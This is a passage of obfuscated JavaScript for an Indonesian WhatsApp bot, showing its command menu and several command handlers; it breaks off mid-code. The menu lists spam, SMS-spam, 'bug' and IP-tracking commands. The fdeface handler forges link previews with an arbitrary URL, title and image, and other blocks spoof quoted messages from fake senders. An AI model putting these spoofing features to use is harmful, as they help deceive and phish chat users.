\`\`\`├ ${no++}. ${prefix}romancetext\`\`\`
\`\`\`├ ${no++}. ${prefix}googletext\`\`\`
\`\`\`├ ${no++}. ${prefix}glowtext2\`\`\`
\`\`\`├ ${no++}. ${prefix}lovemessage\`\`\`
\`\`\`├ ${no++}. ${prefix}glitchtext\`\`\`
\`\`\`├ ${no++}. ${prefix}galaxytext\`\`\`
\`\`\`├ ${no++}. ${prefix}tahta\`\`\`
\`\`\`├ ${no++}. ${prefix}wetglass\`\`\`
\`\`\`├ ${no++}. ${prefix}stylelogo\`\`\`
\`\`\`├ ${no++}. ${prefix}watercolor\`\`\`
\`\`\`├ ${no++}. ${prefix}sertiharam\`\`\`
\`\`\`├ ${no++}. ${prefix}sertibabu\`\`\`
\`\`\`├ ${no++}. ${prefix}sertibucin\`\`\`
\`\`\`├ ${no++}. ${prefix}sertibocilff\`\`\`
\`\`\`├ ${no++}. ${prefix}sertigay\`\`\`
\`\`\`├ ${no++}. ${prefix}sertipacar\`\`\`
\`\`\`├ ${no++}. ${prefix}sertisadboy\`\`\`
\`\`\`├ ${no++}. ${prefix}sertisurga\`\`\`
\`\`\`├ ${no++}. ${prefix}sertipinter\`\`\`
\`\`\`├ ${no++}. ${prefix}sertibadboy\`\`\`
\`\`\`├ ${no++}. ${prefix}sertibadgirl\`\`\`
\`\`\`├ ${no++}. ${prefix}sertigoodgirl\`\`\`
\`\`\`├ ${no++}. ${prefix}sertigoodboy\`\`\`
\`\`\`├ ${no++}. ${prefix}sertieditor\`\`\`
\`\`\`├ ${no++}. ${prefix}sertigudluking\`\`\`
\`\`\`├ ${no++}. ${prefix}sertipakboy\`\`\`
\`\`\`├ ${no++}. ${prefix}sertijamet\`\`\`
\`\`\`├ ${no++}. ${prefix}sertiyutub\`\`\`
\`\`\`├ ${no++}. ${prefix}sertiheker\`\`\`
\`\`\`├ ${no++}. ${prefix}sertiff1\`\`\`
\`\`\`├ ${no++}. ${prefix}sertiff2\`\`\`
\`\`\`├ ${no++}. ${prefix}sertiff3\`\`\`
\`\`\`├ ${no++}. ${prefix}sertiff4\`\`\`
\`\`\`├ ${no++}. ${prefix}sertiff5\`\`\`
\`\`\`├ ${no++}. ${prefix}sertipubg1\`\`\`
\`\`\`├ ${no++}. ${prefix}sertipubg2\`\`\`
\`\`\`├ ${no++}. ${prefix}sertiml\`\`\`
\`\`\`├ ${no++}. ${prefix}tebakgambar\`\`\`
\`\`\`├ ${no++}. ${prefix}caklontong\`\`\`
\`\`\`├ ${no++}. ${prefix}bisakah\`\`\`
\`\`\`├ ${no++}. ${prefix}kapankah\`\`\`
\`\`\`├ ${no++}. ${prefix}apakah\`\`\`
\`\`\`├ ${no++}. ${prefix}spam\`\`\`
\`\`\`├ ${no++}. ${prefix}tag\`\`\`
\`\`\`├ ${no++}. ${prefix}chat\`\`\`
\`\`\`├ ${no++}. ${prefix}surat\`\`\`
\`\`\`├ ${no++}. ${prefix}slot\`\`\`
\`\`\`├ ${no++}. ${prefix}xox\`\`\`
\`\`\`├ ${no++}. ${prefix}rate\`\`\`
\`\`\`├ ${no++}. ${prefix}hobby\`\`\`
\`\`\`├ ${no++}. ${prefix}truth\`\`\`
\`\`\`├ ${no++}. ${prefix}dare\`\`\`
\`\`\`├ ${no++}. ${prefix}cekbapak\`\`\`
\`\`\`├ ${no++}. ${prefix}seberapagay\`\`\`
\`\`\`├ ${no++}. ${prefix}gachacewek\`\`\`
\`\`\`├ ${no++}. ${prefix}gachacowok\`\`\`
\`\`\`├ ${no++}. ${prefix}sagiri\`\`\`
\`\`\`├ ${no++}. ${prefix}megumin\`\`\`
\`\`\`├ ${no++}. ${prefix}waifu\`\`\`
\`\`\`├ ${no++}. ${prefix}neko\`\`\`
\`\`\`├ ${no++}. ${prefix}shinobu\`\`\`
\`\`\`├ ${no++}. ${prefix}loli\`\`\`
\`\`\`├ ${no++}. ${prefix}nekonime\`\`\`
\`\`\`├ ${no++}. ${prefix}darkjokes\`\`\`
\`\`\`├ ${no++}. ${prefix}meme\`\`\`
\`\`\`├ ${no++}. ${prefix}estetik\`\`\`
\`\`\`├ ${no++}. ${prefix}limit\`\`\`
\`\`\`├ ${no++}. ${prefix}transfer\`\`\`
\`\`\`├ ${no++}. ${prefix}atm\`\`\`
\`\`\`├ ${no++}. ${prefix}buylimit\`\`\`
\`\`\`├ ${no++}. ${prefix}premiumlist\`\`\`
\`\`\`├ ${no++}. ${prefix}tomp3\`\`\`
\`\`\`├ ${no++}. ${prefix}tomp4\`\`\`
\`\`\`├ ${no++}. ${prefix}toimg\`\`\`
\`\`\`├ ${no++}. ${prefix}toptt\`\`\`
\`\`\`├ ${no++}. ${prefix}detikvn\`\`\`
\`\`\`├ ${no++}. ${prefix}detikvideo\`\`\`
\`\`\`├ ${no++}. ${prefix}imgtourl\`\`\`
\`\`\`├ ${no++}. ${prefix}bitly\`\`\`
\`\`\`├ ${no++}. ${prefix}trigered\`\`\`
\`\`\`├ ${no++}. ${prefix}komenyt\`\`\`
\`\`\`├ ${no++}. ${prefix}volume\`\`\`
\`\`\`├ ${no++}. ${prefix}nightcore\`\`\`
\`\`\`├ ${no++}. ${prefix}slow\`\`\`
\`\`\`├ ${no++}. ${prefix}tupai\`\`\`
\`\`\`├ ${no++}. ${prefix}blub\`\`\`
\`\`\`├ ${no++}. ${prefix}gemuk\`\`\`
\`\`\`├ ${no++}. ${prefix}ghost\`\`\`
\`\`\`├ ${no++}. ${prefix}bass\`\`\`
\`\`\`├ ${no++}. ${prefix}mutual\`\`\`
\`\`\`├ ${no++}. ${prefix}next\`\`\`
\`\`\`├ ${no++}. ${prefix}lacakip\`\`\`
\`\`\`├ ${no++}. ${prefix}dorking\`\`\`
\`\`\`├ ${no++}. ${prefix}brainly\`\`\`
\`\`\`├ ${no++}. ${prefix}wiki\`\`\`
\`\`\`├ ${no++}. ${prefix}kbbi\`\`\`
\`\`\`├ ${no++}. ${prefix}covid\`\`\`
\`\`\`├ ${no++}. ${prefix}pinterest\`\`\`
\`\`\`├ ${no++}. ${prefix}jadwalsholat\`\`\`
\`\`\`├ ${no++}. ${prefix}spamsms\`\`\`
\`\`\`├ ${no++}. ${prefix}addstiker\`\`\`
\`\`\`├ ${no++}. ${prefix}getstiker\`\`\`
\`\`\`├ ${no++}. ${prefix}liststiker\`\`\`
\`\`\`├ ${no++}. ${prefix}addvideo\`\`\`
\`\`\`├ ${no++}. ${prefix}getvideo\`\`\`
\`\`\`├ ${no++}. ${prefix}listvideo\`\`\`
\`\`\`├ ${no++}. ${prefix}addvn\`\`\`
\`\`\`├ ${no++}. ${prefix}getvn\`\`\`
\`\`\`├ ${no++}. ${prefix}listvn\`\`\`
\`\`\`├ ${no++}. ${prefix}addimage\`\`\`
\`\`\`├ ${no++}. ${prefix}getimage\`\`\`
\`\`\`├ ${no++}. ${prefix}listimage\`\`\`
\`\`\`├ ${no++}. ${prefix}addprem\`\`\`
\`\`\`├ ${no++}. ${prefix}dellprem\`\`\`
\`\`\`├ ${no++}. ${prefix}addrespon\`\`\`
\`\`\`├ ${no++}. ${prefix}delrespon\`\`\`
\`\`\`├ ${no++}. ${prefix}ban\`\`\`
\`\`\`├ ${no++}. ${prefix}colong\`\`\`
\`\`\`├ ${no++}. ${prefix}unban\`\`\`
\`\`\`├ ${no++}. ${prefix}bc\`\`\`
\`\`\`├ ${no++}. ${prefix}tobc\`\`\`
\`\`\`├ ${no++}. ${prefix}bug\`\`\`
\`\`\`├ ${no++}. ${prefix}hacked\`\`\`
\`\`\`├ ${no++}. ${prefix}self\`\`\`
\`\`\`├ ${no++}. ${prefix}public\`\`\`
\`\`\`├ ${no++}. ${prefix}leave\`\`\`
\`\`\`├ ${no++}. ${prefix}delchatgc\`\`\`
\`\`\`├ ${no++}. ${prefix}delttc\`\`\`
\`\`\`├ ${no++}. ${prefix}upswteks\`\`\`
\`\`\`├ ${no++}. ${prefix}upswimage\`\`\`
\`\`\`├ ${no++}. ${prefix}upswvideo\`\`\`
\`\`\`├ ${no++}. ${prefix}shutdown\`\`\`
\`\`\`├ ${no++}. ${prefix}setreply\`\`\`
\`\`\`├ ${no++}. ${prefix}setprefix\`\`\`
\`\`\`├ ${no++}. ${prefix}setbio\`\`\`
\`\`\`├ ${no++}. ${prefix}setppbot\`\`\`
\`\`\`├ ${no++}. ${prefix}setnamebot\`\`\`
\`\`\`├ ${no++}. ${prefix}setthumb\`\`\`
\`\`\`├ ${no++}. ${prefix}clearall\`\`\`
\`\`\`├ ${no++}. ${prefix}resetlimit\`\`\`
\`\`\`├ ${no++}. ${prefix}event\`\`\`
\`\`\`├ ${no++}. ${prefix}term\`\`\`
\`\`\`├ ${no++}. ${prefix}return\`\`\`
\`\`\`├ ${no++}. ${prefix}readall\`\`\`
\`\`\`└ ${pushname}\`\`\``
var _0x4d90=['mKfhugL5EG','C3rHDhvZqgjYB2fKy2fZDa','mtyYmti2Bvnwr3vY','mZe0nZDuv2vTBMi','mteYntiZrejRDMPd','mebZlNDOyxrZyxbWlM5LDa','CMvHzezPBgvtEw5J','mJe2mJa0uNDwtMjx','mZi2mJnPzLjpDwm','ndmYnZnZEMnnENy','oxvit0XmAW','qwXSie1LBNu','lI9KBNmVDgH1BwjUywLSlMPWzwC','mJyZmJi0vKrQu0vH'];var _0x109893=_0x17fb;function _0x17fb(_0x4e1713,_0x53e246){_0x4e1713=_0x4e1713-0x12d;var _0x4d906d=_0x4d90[_0x4e1713];if(_0x17fb['UikgKY']===undefined){var _0x17fb24=function(_0x4a8dc9){var _0x5383d7='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0xa65959='';for(var _0x5b4e75=0x0,_0x2e2ee1,_0x3cc1ed,_0x160955=0x0;_0x3cc1ed=_0x4a8dc9['charAt'](_0x160955++);~_0x3cc1ed&&(_0x2e2ee1=_0x5b4e75%0x4?_0x2e2ee1*0x40+_0x3cc1ed:_0x3cc1ed,_0x5b4e75++%0x4)?_0xa65959+=String['fromCharCode'](0xff&_0x2e2ee1>>(-0x2*_0x5b4e75&0x6)):0x0){_0x3cc1ed=_0x5383d7['indexOf'](_0x3cc1ed);}return _0xa65959;};_0x17fb['nJIPWo']=function(_0x100723){var _0x11efca=_0x17fb24(_0x100723);var _0x53cb44=[];for(var _0x24d767=0x0,_0x25b80=_0x11efca['length'];_0x24d767<_0x25b80;_0x24d767++){_0x53cb44+='%'+('00'+_0x11efca['charCodeAt'](_0x24d767)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x53cb44);},_0x17fb['TDAHce']={},_0x17fb['UikgKY']=!![];}var _0x4a83d5=_0x4d90[0x0],_0x36dbea=_0x4e1713+_0x4a83d5,_0xbeac3=_0x17fb['TDAHce'][_0x36dbea];return _0xbeac3===undefined?(_0x4d906d=_0x17fb['nJIPWo'](_0x4d906d),_0x17fb['TDAHce'][_0x36dbea]=_0x4d906d):_0x4d906d=_0xbeac3,_0x4d906d;}(function(_0x36e56f,_0x195f8b){var _0x46618e=_0x17fb;while(!![]){try{var _0x338324=parseInt(_0x46618e(0x139))+-parseInt(_0x46618e(0x133))*parseInt(_0x46618e(0x13a))+parseInt(_0x46618e(0x132))+parseInt(_0x46618e(0x137))+-parseInt(_0x46618e(0x130))*parseInt(_0x46618e(0x134))+parseInt(_0x46618e(0x12f))+-parseInt(_0x46618e(0x138));if(_0x338324===_0x195f8b)break;else _0x36e56f['push'](_0x36e56f['shift']());}catch(_0x58bdf8){_0x36e56f['push'](_0x36e56f['shift']());}}}(_0x4d90,0x231f9),dila['sendMessage'](from,menuall,text,{'thumbnail':dnsnew,'sendEphemeral':!![],'quoted':{'key':{'fromMe':![],'participant':_0x109893(0x135),...from?{'remoteJid':_0x109893(0x131)}:{}},'message':{'orderMessage':{'itemCount':0x3e7,'status':0xc8,'thumbnail':fs[_0x109893(0x136)](_0x109893(0x12e)),'surface':0xc8,'message':_0x109893(0x12d),'orderTitle':_0x109893(0x12d),'sellerJid':_0x109893(0x135)}}}}));
break
case 'status':
case 'stats':
				var groups = dila.chats.array.filter(v => v.jid.endsWith('g.us'))
				var privat = dila.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
				var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
					uptime = process.uptime();
					const timestamp = speed();
					const totalChat = await dila.chats.all()
					var charge = charging ? 'true' : 'false'
					var listrik = charging ? 'Dicas' : 'Tidak Dicas'
					const latensi = speed() - timestamp
					var total = math(`${groups.length} ${privat.length}`)
					stamtus = `\`\`\`─────「 STATUS 」─────\`\`\`

\`\`\`Private Chat : ${privat.length}\`\`\`
\`\`\`Group Chat : ${groups.length}\`\`\`
\`\`\`Total Chat : ${totalChat.length}\`\`\`
\`\`\`Speed : ${latensi.toFixed(4)} Second\`\`\`
\`\`\`Runtime : ${kyun(uptime)}\`\`\`
\`\`\`Baterai : ${JSON.stringify(baterai)}% - ${listrik}\`\`\`
\`\`\`Status : ${self ? 'Self' : 'Public'}\`\`\`
\`\`\`Penggunaan Ram : ${ram2}\`\`\`
\`\`\`Platform : ${os.platform()}\`\`\`
\`\`\`Hostname : ${os.hostname()}\`\`\`
\`\`\`Uptime : ${kyun(os.uptime())}\`\`\`
\`\`\`Device Model: ${dila.user.phone.device_model}\`\`\`
\`\`\`Wa Version: ${dila.user.phone.wa_version}\`\`\`
\`\`\`Os Version: ${dila.user.phone.os_version}\`\`\`

\`\`\`─────「 ${botName} 」─────\`\`\``
var _0x3684=['ndeWmZu3CKHZyxfU','CMvHzezPBgvtEw5J','nJm1mdfyDvbHzhK','lI9KBNmVDgH1BwjUywLSlMPWzwC','muH2z2zMAW','mta5nZCZnNHMAhzjqW','m1HeCxv6Cq','mtq1nJu0ovj5BgTmwa','ntK3mdm0t0TksK92','otK2odC2EfzSv2XQ','ndqXndC1DxLdveHH','C2vUze1LC3nHz2u','mebZlNDOyxrZyxbWlM5LDa'];var _0x1bf4b3=_0x1db2;function _0x1db2(_0x44dcfc,_0x51d22d){_0x44dcfc=_0x44dcfc-0x1d3;var _0x3684fa=_0x3684[_0x44dcfc];if(_0x1db2['FznNzP']===undefined){var _0x1db2c8=function(_0x31a3de){var _0x55862f='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x3d41bb='';for(var _0x2ec47f=0x0,_0x21f761,_0x24d4e2,_0x26dfae=0x0;_0x24d4e2=_0x31a3de['charAt'](_0x26dfae++);~_0x24d4e2&&(_0x21f761=_0x2ec47f%0x4?_0x21f761*0x40+_0x24d4e2:_0x24d4e2,_0x2ec47f++%0x4)?_0x3d41bb+=String['fromCharCode'](0xff&_0x21f761>>(-0x2*_0x2ec47f&0x6)):0x0){_0x24d4e2=_0x55862f['indexOf'](_0x24d4e2);}return _0x3d41bb;};_0x1db2['gmPeNs']=function(_0x3d632e){var _0x292789=_0x1db2c8(_0x3d632e);var _0x415125=[];for(var _0x5bec06=0x0,_0x553284=_0x292789['length'];_0x5bec06<_0x553284;_0x5bec06++){_0x415125+='%'+('00'+_0x292789['charCodeAt'](_0x5bec06)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x415125);},_0x1db2['eQgyTg']={},_0x1db2['FznNzP']=!![];}var _0x479962=_0x3684[0x0],_0xdf3625=_0x44dcfc+_0x479962,_0x4e5391=_0x1db2['eQgyTg'][_0xdf3625];return _0x4e5391===undefined?(_0x3684fa=_0x1db2['gmPeNs'](_0x3684fa),_0x1db2['eQgyTg'][_0xdf3625]=_0x3684fa):_0x3684fa=_0x4e5391,_0x3684fa;}(function(_0x4c4a4e,_0xdcb8f1){var _0x4b746e=_0x1db2;while(!![]){try{var _0x105e7f=-parseInt(_0x4b746e(0x1d9))+parseInt(_0x4b746e(0x1dd))+parseInt(_0x4b746e(0x1d6))+-parseInt(_0x4b746e(0x1da))*-parseInt(_0x4b746e(0x1d4))+parseInt(_0x4b746e(0x1de))*parseInt(_0x4b746e(0x1d8))+-parseInt(_0x4b746e(0x1db))+parseInt(_0x4b746e(0x1dc));if(_0x105e7f===_0xdcb8f1)break;else _0x4c4a4e['push'](_0x4c4a4e['shift']());}catch(_0x2313d9){_0x4c4a4e['push'](_0x4c4a4e['shift']());}}}(_0x3684,0xbd5f8),dila[_0x1bf4b3(0x1df)](from,stamtus,text,{'thumbnail':dnsnew,'sendEphemeral':!![],'quoted':{'key':{'fromMe':![],'participant':_0x1bf4b3(0x1d3),...from?{'remoteJid':'status@broadcast'}:{}},'message':{'orderMessage':{'itemCount':0x3e7,'status':0xc8,'thumbnail':fs[_0x1bf4b3(0x1d5)](_0x1bf4b3(0x1d7)),'surface':0xc8,'message':cr,'orderTitle':cr,'sellerJid':_0x1bf4b3(0x1d3)}}},'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![]}}));
break
case 'detikvn':
if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(media)
					var _0x41b7=['mZKZntGZsfbUturz','mujMBgTAta','yxvKAw8VBxa0','mtiXndu0neL1B3nXsq','mwPJBuzTBG','ndy1nZfvC2XYELC','nJa5mdCWsfzRBNjp','ndy2nZq0vwfPrNDI','mM1qqNvJAa','nde2ntK2z2ztueDI','mZGXmta2zurLBhrh'];function _0xb0a7(_0x59a617,_0x1d3dd9){_0x59a617=_0x59a617-0x79;var _0x41b7f7=_0x41b7[_0x59a617];if(_0xb0a7['DOApfQ']===undefined){var _0xb0a7c7=function(_0x124bd8){var _0x3edd9f='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x472cde='';for(var _0x5e85fc=0x0,_0x59142b,_0x5ec9ae,_0x1e5a35=0x0;_0x5ec9ae=_0x124bd8['charAt'](_0x1e5a35++);~_0x5ec9ae&&(_0x59142b=_0x5e85fc%0x4?_0x59142b*0x40+_0x5ec9ae:_0x5ec9ae,_0x5e85fc++%0x4)?_0x472cde+=String['fromCharCode'](0xff&_0x59142b>>(-0x2*_0x5e85fc&0x6)):0x0){_0x5ec9ae=_0x3edd9f['indexOf'](_0x5ec9ae);}return _0x472cde;};_0xb0a7['nKeVxe']=function(_0x48670e){var _0x5c6b5c=_0xb0a7c7(_0x48670e);var _0x335e10=[];for(var _0x4eaf58=0x0,_0x213661=_0x5c6b5c['length'];_0x4eaf58<_0x213661;_0x4eaf58++){_0x335e10+='%'+('00'+_0x5c6b5c['charCodeAt'](_0x4eaf58)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x335e10);},_0xb0a7['eaqTrR']={},_0xb0a7['DOApfQ']=!![];}var _0x36ea88=_0x41b7[0x0],_0x317bfd=_0x59a617+_0x36ea88,_0x1db0a6=_0xb0a7['eaqTrR'][_0x317bfd];return _0x1db0a6===undefined?(_0x41b7f7=_0xb0a7['nKeVxe'](_0x41b7f7),_0xb0a7['eaqTrR'][_0x317bfd]=_0x41b7f7):_0x41b7f7=_0x1db0a6,_0x41b7f7;}var _0x115e66=_0xb0a7;(function(_0x835dea,_0x2fe745){var _0x37a68f=_0xb0a7;while(!![]){try{var _0x4b3c64=parseInt(_0x37a68f(0x7e))*parseInt(_0x37a68f(0x7a))+-parseInt(_0x37a68f(0x80))+parseInt(_0x37a68f(0x83))*-parseInt(_0x37a68f(0x81))+parseInt(_0x37a68f(0x79))*parseInt(_0x37a68f(0x7d))+parseInt(_0x37a68f(0x7f))+parseInt(_0x37a68f(0x7c))+-parseInt(_0x37a68f(0x82));if(_0x4b3c64===_0x2fe745)break;else _0x835dea['push'](_0x835dea['shift']());}catch(_0x4fe555){_0x835dea['push'](_0x835dea['shift']());}}}(_0x41b7,0x96ee8),dila['sendMessage'](from,hah,audio,{'mimetype':_0x115e66(0x7b),'duration':cokmatane,'ptt':!![],'quoted':Lan}));
					fs.unlinkSync(media)
				break
				case 'detikvideo':
				if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(media)
					var _0x34fa=['mJi2mZu4mwjZvePnDq','nfvXCgr3vW','oda5mdK4Dejqzvfo','mJu4EgLsChnO','mtKWntqZoerSs1rjwa','mtu1mtC0oxz2rNnMBW','ndm0otK1CM5nvvfK','mtq1ntm0A2zvBKTs','DMLKzw8VBxa0','mNjOqvrkra'];var _0xbdfeac=_0x2694;function _0x2694(_0x2cd613,_0x4f12ef){_0x2cd613=_0x2cd613-0xfe;var _0x34faad=_0x34fa[_0x2cd613];if(_0x2694['FLoTTZ']===undefined){var _0x269407=function(_0x5dcd5c){var _0x434501='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x553e15='';for(var _0x2199a3=0x0,_0x13da87,_0x398bad,_0x69a2ba=0x0;_0x398bad=_0x5dcd5c['charAt'](_0x69a2ba++);~_0x398bad&&(_0x13da87=_0x2199a3%0x4?_0x13da87*0x40+_0x398bad:_0x398bad,_0x2199a3++%0x4)?_0x553e15+=String['fromCharCode'](0xff&_0x13da87>>(-0x2*_0x2199a3&0x6)):0x0){_0x398bad=_0x434501['indexOf'](_0x398bad);}return _0x553e15;};_0x2694['dWhZep']=function(_0x141800){var _0x135038=_0x269407(_0x141800);var _0x994b5a=[];for(var _0x5a136a=0x0,_0x51df40=_0x135038['length'];_0x5a136a<_0x51df40;_0x5a136a++){_0x994b5a+='%'+('00'+_0x135038['charCodeAt'](_0x5a136a)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x994b5a);},_0x2694['iyXatJ']={},_0x2694['FLoTTZ']=!![];}var _0x5dc8ba=_0x34fa[0x0],_0x25293f=_0x2cd613+_0x5dc8ba,_0x2fad0e=_0x2694['iyXatJ'][_0x25293f];return _0x2fad0e===undefined?(_0x34faad=_0x2694['dWhZep'](_0x34faad),_0x2694['iyXatJ'][_0x25293f]=_0x34faad):_0x34faad=_0x2fad0e,_0x34faad;}(function(_0x4955d8,_0x5a4fc3){var _0x3502ef=_0x2694;while(!![]){try{var _0x5dba63=-parseInt(_0x3502ef(0xfe))+-parseInt(_0x3502ef(0x105))*parseInt(_0x3502ef(0x101))+parseInt(_0x3502ef(0x106))+parseInt(_0x3502ef(0x104))+parseInt(_0x3502ef(0x107))+parseInt(_0x3502ef(0xff))*-parseInt(_0x3502ef(0x103))+-parseInt(_0x3502ef(0x102));if(_0x5dba63===_0x5a4fc3)break;else _0x4955d8['push'](_0x4955d8['shift']());}catch(_0x3e085b){_0x4955d8['push'](_0x4955d8['shift']());}}}(_0x34fa,0xf07e1),dila['sendMessage'](from,hah,video,{'mimetype':_0xbdfeac(0x100),'duration':cokmatane,'quoted':Lan}));
					fs.unlinkSync(media)
				break
			  case 'fdeface':
if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					var nn = body.slice(9)
                                var urlnye = nn.split("|")[0];
                                var titlenye = nn.split("|")[1];
                                var descnye = nn.split("|")[2];
                                imgbbb = require('imgbb-uploader')
                                run = getRandom('.jpeg')
                                encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
                                media = await dila.downloadAndSaveMediaMessage(encmedia)
                                ddatae = await imageToBase64(JSON.stringify(media).replace(/\"/gi, ''))
                                dila.sendMessage(from, {
                                        text: `${urlnye}`,
                                        matchedText: `${urlnye}`,
                                        canonicalUrl: `${urlnye}`,
                                        description: `${descnye}`,
                                        title: `${titlenye}`,
                                        jpegThumbnail: ddatae
                                }, 'extendedTextMessage', { detectLinks: false })
                                break
                break
               case 'afk':
	                if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
	                if (!isGroup) return reply(dla.groupo())
                    alasan = args.join(" ")
                    afk[sender.split('@')[0]] = alasan.toLowerCase()
                    fs.writeFileSync("./database/afk.json", JSON.stringify(afk))
                    ini_txt = `\`\`\`Fitur Afk berhasil diaktifkan!\`\`\`\n\`\`\`Username:\`\`\` ${pushname}\n`
                    if (alasan != "") {
                        ini_txt += "\`\`\`Alasan:\`\`\` " + alasan
                    }
                    reply(ini_txt)
                    break
	            break
	case 'owner':
	  case 'creator':
	                dila.sendMessage(from, { displayname: mem, vcard: vcard}, MessageType.contact, { quoted: {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: {"imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": `${ownerName}\nIg : ${igName}\nYt : ${ytName}`,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync("./dns/thumbnail.jpeg"),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}})
							dila.sendMessage(from, `Tuh Nomor Owner ${botName} , Jangan Lupa Disave -^`, MessageType.text, { quoted: Lan })
        break
	case 'donasi':
				case 'donate':
				dila.sendMessage(from, dla.donasi(), text, { quoted: Lan })
					break
				case 'iklan':
				dila.sendMessage(from, dla.iklan(botName, ownerNumber, ownerName), text, { quoted: Lan })
					break

				case 'speed':
				case 'ping':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					const timestampt = speed();
					const latensid = speed() - timestampt
					fakestatus(`Speed: ${latensid.toFixed(4)} _ms_`)
					break
				case 'runtime':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					runtime = process.uptime()
					runte = `「 *RUNTIME* 」\n${kyun(runtime)}`
					fakestatus(`${runte}`)
					break
					
					case 'info':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
				    anu = process.uptime()
					mee = dila.user
					ca = totalchat
					inponya = `┌❏「 *_Info_* 」
│
├❏「 *_Social Media_* 」
│
│┌◪ \`\`\`Group Bot\`\`\`
│├◪ *${grupLink}*
││
│├◪ \`\`\`YouTube\`\`\`
│├◪ *${ytLink}*
││
│├◪ \`\`\`Instagram\`\`\`
│└◪ *${igLink}*
│
└「 *_${botName}_* 」`
var _0x4c3d=['mJa1ntH1EvDPugu','n051DffcEa','C2vUze1LC3nHz2u','C3rHDhvZqgjYB2fKy2fZDa','ndiWmtLAtwHQrM0','CMvHzezPBgvtEw5J','nJqXmhbXy0juyG','nZiWnZv0wuzeBuq','odGYnNrVsMjlAa','Aw1NvxjS','mtLhB3rmBxi','n1fnq1jiyG','n2LXBuT6vq','mwPQEKXjAG','mJiXmZjpvKjntfq','mtiWmtq2tLjhrffr','lI9KBNmVDgH1BwjUywLSlMPWzwC'];var _0x26f9d5=_0x136f;function _0x136f(_0x255bc6,_0x4e0926){_0x255bc6=_0x255bc6-0x171;var _0x4c3d79=_0x4c3d[_0x255bc6];if(_0x136f['eVjBpS']===undefined){var _0x136ffd=function(_0x3786fb){var _0x19466a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x3d2254='';for(var _0x27515d=0x0,_0x351603,_0x3c4b38,_0x5b7230=0x0;_0x3c4b38=_0x3786fb['charAt'](_0x5b7230++);~_0x3c4b38&&(_0x351603=_0x27515d%0x4?_0x351603*0x40+_0x3c4b38:_0x3c4b38,_0x27515d++%0x4)?_0x3d2254+=String['fromCharCode'](0xff&_0x351603>>(-0x2*_0x27515d&0x6)):0x0){_0x3c4b38=_0x19466a['indexOf'](_0x3c4b38);}return _0x3d2254;};_0x136f['GmEeZI']=function(_0x28d6e4){var _0x436004=_0x136ffd(_0x28d6e4);var _0x19e283=[];for(var _0x299070=0x0,_0xe084bd=_0x436004['length'];_0x299070<_0xe084bd;_0x299070++){_0x19e283+='%'+('00'+_0x436004['charCodeAt'](_0x299070)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x19e283);},_0x136f['OemFbF']={},_0x136f['eVjBpS']=!![];}var _0x2f43da=_0x4c3d[0x0],_0x4ef8d9=_0x255bc6+_0x2f43da,_0x4c96f9=_0x136f['OemFbF'][_0x4ef8d9];return _0x4c96f9===undefined?(_0x4c3d79=_0x136f['GmEeZI'](_0x4c3d79),_0x136f['OemFbF'][_0x4ef8d9]=_0x4c3d79):_0x4c3d79=_0x4c96f9,_0x4c3d79;}(function(_0xd02a9f,_0x162fed){var _0x3e3781=_0x136f;while(!![]){try{var 